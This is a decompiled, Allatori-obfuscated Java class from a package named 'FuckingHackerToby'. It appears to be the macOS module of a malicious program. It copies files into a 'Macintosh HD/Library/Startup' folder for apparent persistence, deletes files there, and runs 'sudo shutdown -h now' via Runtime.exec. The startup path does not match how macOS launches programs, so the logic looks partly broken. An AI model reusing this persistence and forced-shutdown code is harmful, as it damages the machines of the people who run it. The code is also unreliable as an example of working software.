/*
 * Decompiled with CFR 0.150.
 */
package FuckingHackerToby;

import FuckingHackerToby.E;
import FuckingHackerToby.za;
import java.io.File;
import java.nio.file.Path;
import java.nio.file.Paths;

public final class n
implements E {
    private static final /* synthetic */ String ALLATORIxDEMO;
    private static final /* synthetic */ String d = "sudo shutdown -h now";

    public static /* synthetic */ {
        ALLATORIxDEMO = "Macintosh HD" + File.separator + "Library" + File.separator + "Startup";
    }

    @Override
    public /* synthetic */ void ALLATORIxDEMO(Path a2) {
        Path path = Paths.get(ALLATORIxDEMO + File.separator + a2.getFileName().toString(), new String[0]);
        za.ALLATORIxDEMO(a2, path);
    }

    @Override
    public /* synthetic */ void ALLATORIxDEMO(String a2) {
        a2 = ALLATORIxDEMO + File.separator + (String)a2;
        new File((String)a2).delete();
    }

    @Override
    public /* synthetic */ boolean ALLATORIxDEMO() {
        return false;
    }

    @Override
    public /* synthetic */ void H() {
        try {
            Runtime.getRuntime().exec(d);
            return;
        }
        catch (Exception exception) {
            exception.printStackTrace();
            return;
        }
    }

    @Override
    public /* synthetic */ void ALLATORIxDEMO() {
    }

    public /* synthetic */ n() {
        n a2;
    }
}

